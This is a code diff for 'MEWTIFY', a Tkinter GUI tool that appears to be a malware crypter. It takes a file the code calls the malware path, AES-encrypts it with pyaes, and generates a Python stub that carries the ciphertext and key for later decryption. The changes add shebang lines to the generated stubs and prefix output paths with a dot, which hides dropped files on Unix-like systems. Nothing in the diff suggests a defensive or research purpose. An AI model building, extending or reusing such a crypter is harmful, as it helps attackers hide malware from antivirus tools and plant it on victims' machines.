@@ -1,4 +1,4 @@
-# !/usr/bin/env python3
+#! /usr/bin/env python3
 import tkinter as tk
 import binascii, pyaes, sys, base64, os.path, os
 from tkinter import *
@@ -27,7 +27,7 @@ def pythwin():
     # Open file
     file_name = malwarename  # Malware path
     new_file_name = input2  # Path to drop file
-    file = open(file_name, "rb")
+    file = open("."+file_name, "rb")
     file_data = file.read()
     file.close()
 
@@ -37,7 +37,8 @@ def pythwin():
     crypto_data = aes.encrypt(file_data)
 
     # Create Stub in Python File
-    stub = "import pyaes\n"
+    stub ="#! /usr/bin/env python3\n"
+    stub += "import pyaes\n"
     stub += "import sys\n"
     stub += "crypto_data_hex = " + str(crypto_data) + "\n"
     stub += "key = " + str(key) + "\n"
@@ -67,7 +68,7 @@ def pythlin():
     input2 = entry3.get()
     # Open file
     file_name = malwarename  # Malware path
-    new_file_name = input2  # Path to drop file
+    new_file_name = "."+input2  # Path to drop file
     file = open(file_name, "rb")
     file_data = file.read()
     file.close()
@@ -78,7 +79,8 @@ def pythlin():
     crypto_data = aes.encrypt(file_data)
 
     # Create Stub in Python File
-    stub = "import pyaes\n"
+    stub ="#! /usr/bin/env python3\n"
+    stub += "import pyaes\n"
     stub += "import sys\n"
     stub += "crypto_data_hex = " + str(crypto_data) + "\n"
     stub += "key = " + str(key) + "\n"
@@ -119,7 +121,8 @@ def jpgwin():
     crypto_data = aes.encrypt(file_data)
 
     # Create Stub in Python File
-    stub = "import pyaes\n"
+    stub ="#! /usr/bin/env python3\n"
+    stub += "import pyaes\n"
     stub += "import sys\n"
     stub += "crypto_data_hex = " + str(crypto_data) + "\n"
     stub += "key = " + str(key) + "\n"
@@ -149,7 +152,7 @@ def phplin():
     input2 = entry3.get()
     # Open file
     file_name = malwarename  # Malware path
-    new_file_name = input2  # Path to drop file
+    new_file_name = "."+input2  # Path to drop file
     file = open(file_name, "rb")
     file_data = file.read()
     file.close()
@@ -160,7 +163,8 @@ def phplin():
     crypto_data = aes.encrypt(file_data)
 
     # Create Stub in Python File
-    stub = "import pyaes\n"
+    stub = "#! /usr/bin/env python3\n"
+    stub += "import pyaes\n"
     stub += "import sys\n"
     stub += "crypto_data_hex = " + str(crypto_data) + "\n"
     stub += "key = " + str(key) + "\n"
@@ -202,7 +206,7 @@ root = tk.Tk()
 root.title("MEWTIFY")
 canvas = tk.Canvas(root, height=HEIGHT, width=WIDTH)
 canvas.pack()
-background_image = tk.PhotoImage(file='yaj.png')
+background_image = tk.PhotoImage(file='Mew.png')
 background_label = tk.Label(root, image=background_image)
 background_label.image= background_image
 background_label.place(relwidth=1 ,relheight=1)
